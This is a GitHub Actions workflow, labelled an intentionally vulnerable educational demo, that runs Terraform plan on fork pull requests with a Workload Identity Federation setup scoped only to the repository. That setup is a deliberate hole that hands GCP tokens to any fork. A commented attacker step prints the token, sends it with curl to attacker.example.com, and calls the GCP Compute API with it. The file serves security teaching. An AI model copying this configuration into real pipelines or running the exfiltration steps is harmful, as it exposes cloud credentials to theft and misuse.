# ⚠️ INTENTIONALLY VULNERABLE — educational demo only
# Trigger: pull_request (including from forks)
# Vulnerability: WIF subject is scoped only to repo name, not branch.
# Any fork can open a PR, trigger terraform plan, and receive a valid GCP token.
# The token can then be used to call GCP APIs with cicd-sa permissions.
name: vulnerable-tf-plan

on:
  pull_request:

permissions:
  contents: read
  id-token: write

jobs:
  plan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Authenticate to Google Cloud (lab / vulnerable WIF)
        uses: google-github-actions/auth@v2
        with:
          workload_identity_provider: ${{ secrets.WIF_PROVIDER_LAB }}
          service_account: ${{ secrets.CICD_LAB_SA_EMAIL }}

      - name: Setup Terraform
        uses: hashicorp/setup-terraform@v3

      - name: Terraform Init
        working-directory: terraform
        env:
          TF_STATE_BUCKET: ${{ secrets.TF_STATE_BUCKET }}
        run: |
          terraform init \
            -backend-config="bucket=${TF_STATE_BUCKET}" \
            -backend-config="prefix=terraform/state"

      - name: Terraform Plan
        working-directory: terraform
        run: terraform plan -input=false

      # ATTACKER STEP — what a malicious fork would add:
      # - name: Exfiltrate token
      #   run: |
      #     TOKEN=$(gcloud auth print-access-token)
      #     curl -X POST https://attacker.example.com/collect -d "token=$TOKEN"
      #     # Now use token to modify GCP resource:
      #     curl -H "Authorization: Bearer $TOKEN" \
      #       https://compute.googleapis.com/compute/v1/projects/$PROJECT/...
